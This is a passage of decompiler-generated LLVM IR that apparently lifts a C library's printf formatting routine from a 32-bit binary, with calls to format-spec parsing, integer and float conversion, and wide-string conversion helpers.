  %v2_24960 = ptrtoint i32* %stack_var_-44 to i32
  %v2_2496c = ptrtoint i32* %stack_var_-52 to i32
  %v7_247c8 = zext i8 %tmp102 to i32
  %v2_24800 = ptrtoint i32* %stack_var_-73 to i32
  %v1_24808 = bitcast i32* %stack_var_-73 to i8*
  %v2_24810 = icmp ugt i32 %tmp104, 4
  %v7_24810 = icmp eq i32 %tmp104, 5
  %v7_246f4 = ptrtoint i32* %stack_var_-280 to i32
  %v5_24724195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_24934 = icmp ugt i32 %tmp104, 16
  %v7_24934 = icmp eq i32 %tmp104, 17
  %v2_24938 = xor i1 %v7_24934, true
  %v3_24938 = and i1 %v2_24934, %v2_24938
  %v2_249bc = icmp ugt i32 %tmp104, 18
  %v7_249bc = icmp eq i32 %tmp104, 19
  %v2_249c0 = xor i1 %v7_249bc, true
  %v3_249c0 = and i1 %v2_249bc, %v2_249c0
  %v7_24a58 = icmp eq i32 %tmp104, 20
  %v1_24770 = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39433)
  %v2_24770 = inttoptr i32 %v1_24770 to i8*
  %v2_2479c = xor i1 %v7_24810, true
  %v3_2479c = and i1 %v2_24810, %v2_2479c
  %v7_247d0 = icmp eq i32 %tmp104, 1
  %v2_24818 = xor i1 %v2_24810, true
  %v3_24818 = or i1 %v7_24810, %v2_24818
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_24880 = icmp eq i32 %tmp104, 3
  %v11_2488c = icmp eq i32 %tmp104, 4
  %v9_246fc = mul nuw nsw i32 %v4_246ec, 8
  %v10_246fc = add i32 %v7_246f4, %v9_246fc
  br label %dec_label_pc_2465c.outer

dec_label_pc_2465c.outer:                         ; preds = %dec_label_pc_24c3c, %dec_label_pc_24608
  %v0_2465c45 = phi i32 [ %v3_24c3c, %dec_label_pc_24c3c ], [ %v0_24658, %dec_label_pc_24608 ]
  %v0_24790 = phi i32 [ %stack_var_-336.4, %dec_label_pc_24c3c ], [ %tmp103, %dec_label_pc_24608 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_24c3c ], [ 0, %dec_label_pc_24608 ]
  br label %dec_label_pc_2465c.outer36

dec_label_pc_2465c.outer36:                       ; preds = %dec_label_pc_2465c.outer, %dec_label_pc_24c48
  %v0_2465c44 = phi i32 [ %v0_2465c45, %dec_label_pc_2465c.outer ], [ %v1_24c48, %dec_label_pc_24c48 ]
  %v5_24688 = phi i32 [ %v0_2465c45, %dec_label_pc_2465c.outer ], [ %v1_246b8, %dec_label_pc_24c48 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_2465c.outer ], [ %v1_24b28, %dec_label_pc_24c48 ]
  %v1_2465c188 = inttoptr i32 %v0_2465c44 to i8*
  %v2_2465c189 = load i8, i8* %v1_2465c188, align 1
  %v2_24660191 = icmp eq i8 %v2_2465c189, 0
  br i1 %v2_24660191, label %dec_label_pc_24678, label %bb138

bb138:                                            ; preds = %dec_label_pc_2465c.outer36, %.thread6
  %v2_2465c193 = phi i8 [ %v2_2465c, %.thread6 ], [ %v2_2465c189, %dec_label_pc_2465c.outer36 ]
  %v1_24670192 = phi i32 [ %v2_24670, %.thread6 ], [ %v0_2465c44, %dec_label_pc_2465c.outer36 ]
  %v8_24664 = icmp eq i8 %v2_2465c193, 37
  br i1 %v8_24664, label %dec_label_pc_24678, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_24670 = add i32 %v1_24670192, 1
  store i32 %v2_24670, i32* @r4, align 4
  %v1_2465c = inttoptr i32 %v2_24670 to i8*
  %v2_2465c = load i8, i8* %v1_2465c, align 1
  %v2_24660 = icmp eq i8 %v2_2465c, 0
  br i1 %v2_24660, label %dec_label_pc_24678, label %bb138

dec_label_pc_24678:                               ; preds = %bb138, %.thread6, %dec_label_pc_2465c.outer36
  %v1_24670.lcssa = phi i32 [ %v0_2465c44, %dec_label_pc_2465c.outer36 ], [ %v2_24670, %.thread6 ], [ %v1_24670192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_24678 = sub i32 %v1_24670.lcssa, %v5_24688
  %v9_24678 = icmp eq i32 %v1_24670.lcssa, %v5_24688
  br i1 %v9_24678, label %dec_label_pc_246ac, label %dec_label_pc_24680

dec_label_pc_24680:                               ; preds = %dec_label_pc_24678
  store i32 %v2_24678, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_24678, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_24680
  store i32 %v5_24688, i32* %r0.global-to-local, align 4
  %v5_24690 = load i32, i32* @fp, align 4
  store i32 %v5_24690, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_24680, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_24680 ]
  store i32 149144, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_2c5d8.1628 to i32))
  %v0_24698 = load i32, i32* %r0.global-to-local, align 4
  %v1_24698 = load i32, i32* @r5, align 4
  %v9_24698 = icmp eq i32 %v0_24698, %v1_24698
  br i1 %v9_24698, label %dec_label_pc_246a0, label %dec_label_pc_24c50

dec_label_pc_246a0:                               ; preds = %bb142
  %v2_246a4 = add i32 %v0_24698, %stack_var_-356.1.ph37
  store i32 %v2_246a4, i32* @ip, align 4
  %v0_246ac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_246ac

dec_label_pc_246ac:                               ; preds = %dec_label_pc_24678, %dec_label_pc_246a0
  %v0_246c0 = phi i32 [ %v5_24688, %dec_label_pc_24678 ], [ %v0_246ac.pre, %dec_label_pc_246a0 ]
  %v1_24b28 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_24678 ], [ %v2_246a4, %dec_label_pc_246a0 ]
  %v1_246ac = inttoptr i32 %v0_246c0 to i8*
  %v2_246ac = load i8, i8* %v1_246ac, align 1
  %v2_246b0 = icmp eq i8 %v2_246ac, 0
  br i1 %v2_246b0, label %dec_label_pc_24c58, label %dec_label_pc_246b8

dec_label_pc_246b8:                               ; preds = %dec_label_pc_246ac
  %v1_246b8 = add i32 %v0_246c0, 1
  %v2_246b8 = inttoptr i32 %v1_246b8 to i8*
  %v3_246b8 = load i8, i8* %v2_246b8, align 1
  %v7_246bc = icmp eq i8 %v3_246b8, 37
  store i32 %v1_246b8, i32* %r2.global-to-local, align 4
  br i1 %v7_246bc, label %dec_label_pc_24c48, label %dec_label_pc_246c8

dec_label_pc_246c8:                               ; preds = %dec_label_pc_246b8
  store i32 %v2_245a8, i32* @r4, align 4
  store i32 %v2_245a8, i32* %r0.global-to-local, align 4
  store i32 %v1_246b8, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_246dc = call i32 @_ppfs_parsespec(i8* %v1_246dc)
  store i32 %v2_245a8, i32* @r0, align 4
  %v0_246e4 = call i32 @_ppfs_setargs()
  store i32 %v0_246e4, i32* %r0.global-to-local, align 4
  store i32 %v4_246ec, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_246c8
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_246c8, %bb145
  %storemerge = phi i32 [ %v10_246fc, %bb145 ], [ %v7_246f8, %dec_label_pc_246c8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_24724195, label %dec_label_pc_24708, label %dec_label_pc_24728

dec_label_pc_24708:                               ; preds = %bb146, %dec_label_pc_24708
  %v5_24714197 = phi i32 [ %v5_24714, %dec_label_pc_24708 ], [ %v2_24710, %bb146 ]
  %v0_24708196 = phi i32 [ %v1_2470c, %dec_label_pc_24708 ], [ %storemerge, %bb146 ]
  %v2_24708 = add i32 %v5_24714197, -32
  %v3_24708 = inttoptr i32 %v2_24708 to i32*
  store i32 %v0_24708196, i32* %v3_24708, align 4
  %v0_2470c = load i32, i32* %r0.global-to-local, align 4
  %v1_2470c = add i32 %v0_2470c, 8
  store i32 %v1_2470c, i32* %r0.global-to-local, align 4
  %v1_24714.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_24714 = mul i32 %v1_24714.pre, 4
  %v5_24714 = add i32 %v4_24714, %v2_24710
  %v1_24720 = add i32 %v1_24714.pre, 1
  store i32 %v1_24720, i32* %r2.global-to-local, align 4
  %v5_24724 = icmp slt i32 %v1_24714.pre, %tmp105
  br i1 %v5_24724, label %dec_label_pc_24708, label %dec_label_pc_24728

dec_label_pc_24728:                               ; preds = %dec_label_pc_24708, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_2472c, label %dec_label_pc_24734, label %dec_label_pc_24758

dec_label_pc_24734:                               ; preds = %dec_label_pc_24728
  %v3_24734 = load i32, i32* %stack_var_-72, align 4
  store i32 %v1_24b28, i32* @ip, align 4
  %v1_24740 = inttoptr i32 %v3_24734 to i32*
  %v2_24740 = load i32, i32* %v1_24740, align 4
  store i32 %v2_24740, i32* %r0.global-to-local, align 4
  %v1_24744 = and i32 %v0_24790, 3840
  store i32 %v1_24b28, i32* %r2.global-to-local, align 4
  %v3_2474c = ashr i32 %v1_24b28, 31
  %v4_24750 = inttoptr i32 %v2_24740 to i16*
  %v5_24750 = call i32 @_store_inttype(i16* %v4_24750, i32 %v1_24744, i32 %v1_24b28, i32 %v3_2474c)
  store i32 %v5_24750, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_24c3c

dec_label_pc_24758:                               ; preds = %dec_label_pc_24728
  br i1 %tmp207, label %dec_label_pc_248f4, label %dec_label_pc_24760

dec_label_pc_24760:                               ; preds = %dec_label_pc_24758
  %v3_24770 = load i8, i8* %v2_24770, align 1
  %v4_24770 = zext i8 %v3_24770 to i32
  %v7_24774 = icmp eq i8 %v3_24770, 10
  br i1 %v7_24774, label %dec_label_pc_24780, label %bb147

bb147:                                            ; preds = %dec_label_pc_24760
  br label %bb151

dec_label_pc_24780:                               ; preds = %dec_label_pc_24760
  %v1_24790 = and i32 %v0_24790, 64
  %v2_24790 = icmp eq i32 %v1_24790, 0
  br i1 %v2_24790, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_24780
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_24780, %bb150
  br i1 %v3_2479c, label %.thread, label %dec_label_pc_247a4

.thread:                                          ; preds = %bb151
  %v5_2479c = sub nsw i32 0, %v4_24770
  br label %dec_label_pc_247bc

dec_label_pc_247a4:                               ; preds = %bb151
  br i1 %v7_24880, label %bb152, label %dec_label_pc_247b0

bb152:                                            ; preds = %dec_label_pc_247a4
  br label %dec_label_pc_247bc

dec_label_pc_247b0:                               ; preds = %dec_label_pc_247a4
  br i1 %v7_247d0, label %dec_label_pc_247c0, label %dec_label_pc_247bc

dec_label_pc_247bc:                               ; preds = %.thread, %bb152, %dec_label_pc_247b0
  %v0_247e881 = phi i32 [ %v5_2479c, %.thread ], [ %v4_24770, %bb152 ], [ %v4_24770, %dec_label_pc_247b0 ]
  br label %dec_label_pc_247c0

dec_label_pc_247c0:                               ; preds = %dec_label_pc_247b0, %dec_label_pc_247bc
  %v0_247e880 = phi i32 [ %v0_247e881, %dec_label_pc_247bc ], [ %v4_24770, %dec_label_pc_247b0 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_247bc ], [ 6, %dec_label_pc_247b0 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_247c0 = load i32, i32* %stack_var_-348, align 4
  %v1_247c4 = icmp slt i32 %v3_247c0, 0
  %v7_247c8. = select i1 %v1_247c4, i32 %v7_247c8, i32 32
  store i32 %v7_247c8., i32* @sb, align 4
  br i1 %v7_247d0, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_247c0
  store i32 %v2_24710, i32* %r2.global-to-local, align 4
  %v2_247d8 = load i32, i32* @ip, align 4
  %v5_247d8 = mul i32 %v2_247d8, 4
  %v6_247d8 = add i32 %v5_247d8, %v2_24710
  %v2_247dc = add i32 %v6_247d8, -276
  %v3_247dc = inttoptr i32 %v2_247dc to i32*
  %v4_247dc = load i32, i32* %v3_247dc, align 4
  %v2_247e4 = and i32 %v4_247dc, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_247c0, %.thread15
  %storemerge93 = phi i32 [ %v2_247e4, %.thread15 ], [ 1024, %dec_label_pc_247c0 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_247e880, i32* @r2, align 4
  %v3_247ec = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_247ec, i32* @r1, align 4
  %v0_247f0 = call i32 @_load_inttype()
  store i32 %v0_247f0, i32* @r2, align 4
  %v0_247fc = load i32, i32* @r1, align 4
  store i32 %v0_247fc, i32* @r3, align 4
  store i32 %v2_24800, i32* %r0.global-to-local, align 4
  %v2_24808 = call i32 @_uintmaxtostr(i8* %v1_24808)
  store i32 %v2_24808, i32* %r0.global-to-local, align 4
  store i32 %v2_24808, i32* @r4, align 4
  br i1 %v3_24818, label %bb160, label %dec_label_pc_2481c

dec_label_pc_2481c:                               ; preds = %bb157
  %v3_24808 = inttoptr i32 %v2_24808 to i8*
  %v3_2481c = load i8, i8* %v3_24808, align 1
  %v7_24820 = icmp eq i8 %v3_2481c, 45
  %v2_24828 = or i32 %v0_24790, 2
  %v2_24828.stack_var_-336.0 = select i1 %v7_24820, i32 %v2_24828, i32 %v0_24790
  br i1 %v7_24820, label %.thread17, label %dec_label_pc_2483c

.thread17:                                        ; preds = %dec_label_pc_2481c
  %v3_2482c = add i32 %v2_24808, 1
  store i32 %v3_2482c, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_2483c:                               ; preds = %dec_label_pc_2481c
  %v1_2483c = and i32 %v2_24828.stack_var_-336.0, 2
  %v2_2483c = icmp eq i32 %v1_2483c, 0
  br i1 %v2_2483c, label %dec_label_pc_24848, label %bb158

bb158:                                            ; preds = %dec_label_pc_2483c
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_24848:                               ; preds = %dec_label_pc_2483c
  %v1_24848 = urem i32 %v2_24828.stack_var_-336.0, 2
  %v2_24848 = icmp eq i32 %v1_24848, 0
  br i1 %v2_24848, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_24848
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_24848, %bb159
  %v0_248a4 = phi i32 [ %v2_24808, %bb157 ], [ %v3_2482c, %.thread17 ], [ %v2_24808, %dec_label_pc_24848 ], [ %v2_24808, %bb159 ], [ %v2_24808, %bb158 ]
  %v0_24860 = phi i32 [ %v0_24790, %bb157 ], [ %v2_24828, %.thread17 ], [ %v0_24790, %dec_label_pc_24848 ], [ %v0_24790, %bb159 ], [ %v0_24790, %bb158 ]
  %v3_24850 = load i32, i32* %stack_var_-348, align 4
  %v1_24858 = icmp slt i32 %v3_24850, 0
  br i1 %v1_24858, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_24850, %bb160 ]
  %v0_24888 = phi i32 [ 1, %bb161 ], [ %v3_24850, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_24860 = and i32 %v0_24860, 16
  %v2_24860 = icmp eq i32 %v1_24860, 0
  %v2_2486c = sub i32 %v2_24800, %v0_248a4
  store i32 %v2_2486c, i32* @r5, align 4
  br i1 %v2_24860, label %bb169, label %dec_label_pc_24874

dec_label_pc_24874:                               ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_24874
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_24874, %bb163
  br i1 %v7_24880, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_24888, %v2_2486c
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_2488c, label %dec_label_pc_24894, label %bb169

dec_label_pc_24894:                               ; preds = %bb167
  %v1_24894 = inttoptr i32 %v0_248a4 to i8*
  %v2_24894 = load i8, i8* %v1_24894, align 1
  %v7_24898 = icmp eq i8 %v2_24894, 48
  br i1 %v7_24898, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_24894
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_24894
  %v2_248a0 = add i32 %v2_2486c, 1
  store i32 %v2_248a0, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_248e4 = phi i32 [ %v0_24888, %bb167 ], [ %v0_24888, %bb162 ], [ 1, %bb168 ], [ %v2_248a0, %.thread24 ], [ %v0_24888, %bb166 ]
  %v1_248a4 = inttoptr i32 %v0_248a4 to i8*
  %v2_248a4 = load i8, i8* %v1_248a4, align 1
  %v7_248a8 = icmp eq i8 %v2_248a4, 48
  br i1 %v7_248a8, label %dec_label_pc_248b0, label %dec_label_pc_248e0

dec_label_pc_248b0:                               ; preds = %bb169
  %v0_248b4 = load i32, i32* @r6, align 4
  %v7_248b8 = icmp slt i32 %v0_248b4, 6
  br i1 %v7_248b8, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_248b0
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_248b0, %bb170
  br i1 %v7_247d0, label %.thread27, label %dec_label_pc_248d4

.thread27:                                        ; preds = %bb171
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39460), i32* @r4, align 4
  br label %dec_label_pc_248ec

dec_label_pc_248d4:                               ; preds = %bb171
  %v2_248d4 = icmp eq i32 %v5_248e4, 0
  br i1 %v2_248d4, label %bb172, label %dec_label_pc_248e0

bb172:                                            ; preds = %dec_label_pc_248d4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_248ec

dec_label_pc_248e0:                               ; preds = %dec_label_pc_248d4, %bb169
  %v2_248e0 = sub i32 %v5_248e4, %v2_2486c
  %tmp211 = icmp ugt i32 %v5_248e4, %v2_2486c
  br i1 %tmp211, label %.thread85, label %dec_label_pc_248ec

.thread85:                                        ; preds = %dec_label_pc_248e0
  store i32 %v2_248e0, i32* @r8, align 4
  br label %dec_label_pc_24af8thread-pre-split

dec_label_pc_248ec:                               ; preds = %dec_label_pc_248e0, %.thread27, %bb172
  %v1_24afc.pre205 = phi i32 [ %v2_2486c, %dec_label_pc_248e0 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_24af8thread-pre-split

dec_label_pc_248f4:                               ; preds = %dec_label_pc_24758
  br i1 %tmp208, label %dec_label_pc_24934, label %dec_label_pc_248fc

dec_label_pc_248fc:                               ; preds = %dec_label_pc_248f4
  %v3_2490c = load i32, i32* %stack_var_-72, align 4
  %v0_24910 = load i32, i32* @fp, align 4
  store i32 %v0_24910, i32* %r0.global-to-local, align 4
  %v1_24914 = inttoptr i32 %v3_2490c to i32*
  %v2_24914 = load i32, i32* %v1_24914, align 4
  store i32 %v2_24914, i32* %r2.global-to-local, align 4
  %v3_24914 = add i32 %v3_2490c, 4
  %v4_24914 = inttoptr i32 %v3_24914 to i32*
  %v5_24914 = load i32, i32* %v4_24914, align 4
  %v8_24918 = call i32 @_fpmaxtostr(i32 %v0_24910, double bitcast (i64 sext (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -132212) to i64) to double), i32 %v2_24914, i32 %v5_24914, i32 %v2_24aa8, i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -132212))
  store i32 %v8_24918, i32* %r0.global-to-local, align 4
  %v1_2491c = icmp slt i32 %v8_24918, 0
  br i1 %v1_2491c, label %dec_label_pc_24c50, label %dec_label_pc_24924

dec_label_pc_24924:                               ; preds = %dec_label_pc_248fc
  %v2_24928 = add i32 %v8_24918, %v1_24b28
  store i32 %v2_24928, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_24c3c

dec_label_pc_24934:                               ; preds = %dec_label_pc_248f4
  br i1 %v3_24938, label %dec_label_pc_249bc, label %dec_label_pc_2493c

dec_label_pc_2493c:                               ; preds = %dec_label_pc_24934
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_24944 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_24944, i32* %r0.global-to-local, align 4
  br i1 %v7_24934, label %dec_label_pc_2494c, label %dec_label_pc_24984

dec_label_pc_2494c:                               ; preds = %dec_label_pc_2493c
  %v1_2494c = inttoptr i32 %v3_24944 to i32*
  %v2_2494c = load i32, i32* %v1_2494c, align 4
  %v9_24950 = icmp eq i32 %v2_2494c, 0
  store i32 %v2_2494c, i32* %stack_var_-44, align 4
  br i1 %v9_24950, label %dec_label_pc_249fc, label %dec_label_pc_2495c

dec_label_pc_2495c:                               ; preds = %dec_label_pc_2494c
  %v3_2495c = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_24960, i32* @r0, align 4
  %v4_24964 = ashr i32 %v3_2495c, 31
  %v5_24964 = or i32 %v4_24964, %v3_2495c
  store i32 %v5_24964, i32* %r2.global-to-local, align 4
  store i32 %v2_24960, i32* @r1, align 4
  %v6_24970 = call i32 @__GI_wcsrtombs(i32 %v2_24960, i32 %v2_24960, i32 %v5_24964, i32 %v2_2496c, i32 0, i32 %v2_2494c)
  store i32 %v6_24970, i32* %r0.global-to-local, align 4
  %v3_24974 = icmp eq i32 %v6_24970, -1
  store i32 %v6_24970, i32* @r5, align 4
  br i1 %v3_24974, label %dec_label_pc_24c50, label %dec_label_pc_24ae8

dec_label_pc_24984:                               ; preds = %dec_label_pc_2493c
  store i32 %v2_24a64, i32* %r7.global-to-local, align 4
  %v1_24988 = inttoptr i32 %v3_24944 to i32*
  %v2_24988 = load i32, i32* %v1_24988, align 4
  store i32 %v2_2496c, i32* %r2.global-to-local, align 4
  store i32 %v2_24a64, i32* %r0.global-to-local, align 4
  %v5_24994 = call i32 @__GI_wcrtomb(i32 %v2_24a64, i32 %v2_24988, i32 %v2_2496c, i32 %tmp105, i32 0)
  store i32 %v5_24994, i32* %r0.global-to-local, align 4
  %v7_24998 = icmp eq i32 %v5_24994, -1
  store i32 %v5_24994, i32* @r5, align 4
  br i1 %v7_24998, label %dec_label_pc_24c50, label %dec_label_pc_249a4

dec_label_pc_249a4:                               ; preds = %dec_label_pc_24984
  %v0_249a4 = load i32, i32* @sl, align 4
  store i32 %v0_249a4, i32* @r8, align 4
  store i32 %v2_24a64, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_249b4 = trunc i32 %v0_249a4 to i8
  %v2_249b4 = load i32, i32* %r7.global-to-local, align 4
  %v4_249b4 = add i32 %v2_249b4, %v5_24994
  %v5_249b4 = inttoptr i32 %v4_249b4 to i8*
  store i8 %v1_249b4, i8* %v5_249b4, align 1
  %v0_24afc.pre.pre = load i32, i32* @r8, align 4
  %v1_24afc.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_24af8thread-pre-split

dec_label_pc_249bc:                               ; preds = %dec_label_pc_24934
  br i1 %v3_249c0, label %dec_label_pc_24a58, label %dec_label_pc_249c4

dec_label_pc_249c4:                               ; preds = %dec_label_pc_249bc
  %v3_249c4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_249c4, i32* %r0.global-to-local, align 4
  %v1_249cc = inttoptr i32 %v3_249c4 to i32*
  %v2_249cc = load i32, i32* %v1_249cc, align 4
  br i1 %v7_249bc, label %dec_label_pc_249cc, label %dec_label_pc_24a30

dec_label_pc_249cc:                               ; preds = %dec_label_pc_249c4
  store i32 %v2_249cc, i32* @r4, align 4
  %v2_249d0 = icmp eq i32 %v2_249cc, 0
  br i1 %v2_249d0, label %dec_label_pc_249fc, label %dec_label_pc_249d8

dec_label_pc_249d8:                               ; preds = %dec_label_pc_249cc, %dec_label_pc_24a60
  %v0_249dc = phi i32 [ %v2_249cc, %dec_label_pc_249cc ], [ %v3_24a70, %dec_label_pc_24a60 ]
  %v3_249d8 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_249dc, i32* %r0.global-to-local, align 4
  %v4_249e0 = ashr i32 %v3_249d8, 31
  %v5_249e0 = or i32 %v4_249e0, %v3_249d8
  %v2_249e4 = inttoptr i32 %v0_249dc to i8*
  %v3_249e4 = call i32 @strnlen(i8* %v2_249e4, i32 %v5_249e0)
  store i32 %v3_249e4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_249e4, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_24af8

dec_label_pc_249fc:                               ; preds = %dec_label_pc_249cc, %dec_label_pc_2494c
  %v3_249fc = load i32, i32* %stack_var_-348, align 4
  %v1_24a00 = icmp slt i32 %v3_249fc, 0
  br i1 %v1_24a00, label %dec_label_pc_24a18, label %dec_label_pc_24a08

dec_label_pc_24a08:                               ; preds = %dec_label_pc_249fc
  %tmp212 = icmp ult i32 %v3_249fc, 6
  br i1 %tmp212, label %dec_label_pc_24a20, label %dec_label_pc_24a18

dec_label_pc_24a18:                               ; preds = %dec_label_pc_24a08, %dec_label_pc_249fc
  br label %dec_label_pc_24a20

dec_label_pc_24a20:                               ; preds = %dec_label_pc_24a08, %dec_label_pc_24a18
  %storemerge97 = phi i32 [ 6, %dec_label_pc_24a18 ], [ 0, %dec_label_pc_24a08 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39452), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_24af8

dec_label_pc_24a30:                               ; preds = %dec_label_pc_249c4
  store i32 %v2_249cc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_24a64, i32* @r4, align 4
  store i32 %v2_249cc, i32* %stack_var_-200, align 4
  br label %dec_label_pc_24af8thread-pre-split

dec_label_pc_24a58:                               ; preds = %dec_label_pc_249bc
  br i1 %v7_24a58, label %dec_label_pc_24a60, label %dec_label_pc_24a7c

dec_label_pc_24a60:                               ; preds = %dec_label_pc_24a58
  %v0_24a60 = call i32 @__GI___errno_location()
  store i32 %v0_24a60, i32* %r0.global-to-local, align 4
  %v1_24a68 = inttoptr i32 %v0_24a60 to i32*
  %v2_24a68 = load i32, i32* %v1_24a68, align 4
  store i32 %v2_24a68, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_24a70 = call i32 @__GI___glibc_strerror_r(i32 %v2_24a68, i32 %v2_24a64, i32 128)
  store i32 %v3_24a70, i32* %r0.global-to-local, align 4
  store i32 %v3_24a70, i32* @r4, align 4
  br label %dec_label_pc_249d8

dec_label_pc_24a7c:                               ; preds = %dec_label_pc_24a58
  %v4_24a84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 20564) to i32*), align 4
  %v1_24a8c = add i32 %v4_24a84, 10
  store i32 %v1_24a8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_24a90

dec_label_pc_24a90:                               ; preds = %dec_label_pc_24ad8, %dec_label_pc_24a7c
  %v1_24aa0 = phi i32 [ %v1_24ad8, %dec_label_pc_24ad8 ], [ %v4_24a84, %dec_label_pc_24a7c ]
  %v1_24a90 = inttoptr i32 %v1_24aa0 to i8*
  %v2_24a90 = load i8, i8* %v1_24a90, align 1
  %v3_24a90 = zext i8 %v2_24a90 to i32
  store i32 %v3_24a90, i32* %r2.global-to-local, align 4
  %v9_24a98 = icmp eq i32 %v3_24a90, %tmp99
  br i1 %v9_24a98, label %dec_label_pc_24aa0, label %dec_label_pc_24ad8

dec_label_pc_24aa0:                               ; preds = %dec_label_pc_24a90
  %v2_24aa0 = sub i32 %v1_24aa0, %v4_24a84
  %v0_24aa4 = load i32, i32* @fp, align 4
  store i32 %v0_24aa4, i32* %r0.global-to-local, align 4
  store i32 %v2_24aac, i32* %r2.global-to-local, align 4
  %v4_24ab4 = mul i32 %v2_24aa0, 4
  %v5_24ab4 = add i32 %v4_24ab4, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 60880)
  %v6_24ab4 = inttoptr i32 %v5_24ab4 to i32*
  %v7_24ab4 = load i32, i32* %v6_24ab4, align 4
  store i32 %v7_24ab4, i32* @ip, align 4
  store i32 150208, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_24ab4)
  %v0_24ac0 = load i32, i32* %r0.global-to-local, align 4
  %v1_24ac0 = icmp slt i32 %v0_24ac0, 0
  br i1 %v1_24ac0, label %dec_label_pc_24c50, label %dec_label_pc_24ac8

dec_label_pc_24ac8:                               ; preds = %dec_label_pc_24aa0
